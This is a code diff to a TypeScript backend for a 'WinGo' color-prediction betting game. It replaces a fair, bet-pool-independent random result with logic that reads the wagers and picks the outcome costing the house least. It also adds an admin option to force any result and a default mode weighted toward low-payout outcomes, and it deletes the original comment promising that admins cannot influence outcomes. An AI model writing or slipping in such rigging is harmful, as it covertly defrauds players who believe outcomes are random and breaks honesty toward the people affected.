@@ -1,10 +1,9 @@
 /**
  * WinGo Color Prediction Engine
- * Results are generated independently of the bet pool with a cryptographically
- * secure random source. Admins can pause rounds, but cannot influence outcomes.
+ * House-edge result selection with optional admin force result + low-win random mode.
+ * Global live rounds: ensure open → settle expired → open next.
  */
 
-import { randomInt } from "crypto";
 import type { PrismaClient } from "@prisma/client";
 
 export type WingoGameKey = "WINGO1" | "WINGO3" | "WINGO5" | "WINGO10";
@@ -72,9 +71,64 @@ export function calcPayout(amount: number, multiplier: number): number {
   return parseFloat((gross - fee).toFixed(2));
 }
 
-/** Generate an unbiased WinGo result without reading the bet pool. */
-export function generateFairWingoResult(): number {
-  return randomInt(0, 10);
+export type BetPool = Record<string, number>;
+
+const CATEGORIES: Array<{ num: number; keys: string[] }> = [
+  { num: 0, keys: ["0", "red", "violet", "small"] },
+  { num: 1, keys: ["1", "green", "small"] },
+  { num: 2, keys: ["2", "red", "small"] },
+  { num: 3, keys: ["3", "green", "small"] },
+  { num: 4, keys: ["4", "red", "small"] },
+  { num: 5, keys: ["5", "green", "violet", "big"] },
+  { num: 6, keys: ["6", "red", "big"] },
+  { num: 7, keys: ["7", "green", "big"] },
+  { num: 8, keys: ["8", "red", "big"] },
+  { num: 9, keys: ["9", "green", "big"] },
+];
+
+function payoutForResult(pool: BetPool, num: number): number {
+  let totalPayout = 0;
+  for (const [bet, wagered] of Object.entries(pool)) {
+    if (checkWin(bet, num)) {
+      totalPayout += wagered * getMultiplier(bet);
+    }
+  }
+  return totalPayout;
+}
+
+/**
+ * Pick a result that minimizes house payout.
+ * forceResult: admin override 0-9
+ * randomLessWin: bias toward cheaper outcomes
+ */
+export function selectHouseResult(
+  pool: BetPool,
+  opts: { forceResult?: number | null; randomLessWin?: boolean } = {}
+): number {
+  if (typeof opts.forceResult === "number" && opts.forceResult >= 0 && opts.forceResult <= 9) {
+    return opts.forceResult;
+  }
+
+  const scored = CATEGORIES.map((c) => ({
+    num: c.num,
+    cost: payoutForResult(pool, c.num),
+  })).sort((a, b) => a.cost - b.cost);
+
+  if (!opts.randomLessWin) {
+    // pure cheapest
+    return scored[0]?.num ?? Math.floor(Math.random() * 10);
+  }
+
+  // weight cheapest outcomes more heavily
+  const cheap = scored.slice(0, 4);
+  const weights = [0.45, 0.28, 0.17, 0.1];
+  const r = Math.random();
+  let acc = 0;
+  for (let i = 0; i < cheap.length; i++) {
+    acc += weights[i] ?? 0.05;
+    if (r <= acc) return cheap[i].num;
+  }
+  return cheap[0]?.num ?? Math.floor(Math.random() * 10);
 }
 
 export function periodId(game: WingoGameKey): string {
@@ -105,15 +159,23 @@ export async function ensureWingoOpenRound(prisma: PrismaClient, game: WingoGame
 
 type WingoAdminCfg = {
   autoPlay?: boolean;
+  randomLessWin?: boolean;
+  forceResult?: number | null;
+  forceOnce?: boolean;
 };
 
 async function readWingoCfg(prisma: PrismaClient): Promise<WingoAdminCfg> {
   try {
     const row = await prisma.appConfig.findUnique({ where: { id: "main" } });
-    const w = (row?.wingoConfig as WingoAdminCfg) || {};
-    return { autoPlay: w.autoPlay !== false };
+    const w = ((row?.wingoConfig as WingoAdminCfg) || {}) as WingoAdminCfg;
+    return {
+      autoPlay: w.autoPlay !== false,
+      randomLessWin: w.randomLessWin !== false,
+      forceResult: typeof w.forceResult === "number" ? w.forceResult : null,
+      forceOnce: !!w.forceOnce,
+    };
   } catch {
-    return { autoPlay: true };
+    return { autoPlay: true, randomLessWin: true, forceResult: null, forceOnce: false };
   }
 }
 
@@ -121,7 +183,11 @@ async function readWingoCfg(prisma: PrismaClient): Promise<WingoAdminCfg> {
  * Tick one game: settle expired open round (if any), then ensure a fresh open round.
  * Safe to call from any client poll — keeps WinGo globally live without cron.
  */
-export async function tickWingoGame(prisma: PrismaClient, game: WingoGameKey) {
+export async function tickWingoGame(
+  prisma: PrismaClient,
+  game: WingoGameKey,
+  opts?: { forceHouse?: boolean }
+) {
   const cfg = await readWingoCfg(prisma);
   if (cfg.autoPlay === false) {
     return { paused: true as const };
@@ -142,8 +208,17 @@ export async function tickWingoGame(prisma: PrismaClient, game: WingoGameKey) {
   let settled: { period: number; result: number } | null = null;
 
   if (expired) {
-    // The outcome is selected independently of wagers and admin settings.
-    const result = generateFairWingoResult();
+    const pool: BetPool = {};
+    for (const b of expired.bets) {
+      pool[b.bet] = (pool[b.bet] || 0) + b.amount;
+    }
+
+    const force =
+      !opts?.forceHouse && typeof cfg.forceResult === "number" ? cfg.forceResult : null;
+    const result = selectHouseResult(pool, {
+      forceResult: force,
+      randomLessWin: opts?.forceHouse ? true : cfg.randomLessWin !== false,
+    });
     const colors = getColors(result);
     const size = getSize(result);
 
@@ -184,6 +259,18 @@ export async function tickWingoGame(prisma: PrismaClient, game: WingoGameKey) {
     });
     settled = { period: expired.period, result };
 
+    // clear one-shot force
+    if (force !== null && cfg.forceOnce) {
+      try {
+        const next = { ...cfg, forceResult: null, forceOnce: false };
+        await prisma.appConfig.update({
+          where: { id: "main" },
+          data: { wingoConfig: next },
+        });
+      } catch {
+        /* */
+      }
+    }
   }
 
   const open = await ensureWingoOpenRound(prisma, game);
